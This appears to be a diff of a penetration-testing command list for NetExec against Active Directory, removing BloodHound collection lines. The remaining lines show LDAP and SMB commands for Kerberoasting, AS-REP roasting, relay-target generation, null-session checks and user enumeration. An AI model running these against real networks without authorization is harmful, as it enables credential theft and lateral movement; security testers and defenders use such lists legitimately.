@@ -3,7 +3,6 @@ netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
 netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
 netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
 netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
-netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dns-server "$DC_HOST" --bloodhound --collection All 
 netexec smb "$RANGE" --gen-relay-list smb_targets.txt
 netexec smb "$RANGE" --local-auth -u '' -p ''
 netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --loggedon-users
@@ -25,7 +24,6 @@ nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
 nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
 nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
 nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
-nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dns-server "$DC_HOST" --bloodhound --collection All 
 nxc smb "$RANGE" --gen-relay-list smb_targets.txt
 nxc smb "$RANGE" --local-auth -u '' -p ''
 nxc smb "$RANGE" -u "$USER" -p "$PASSWORD" --loggedon-users
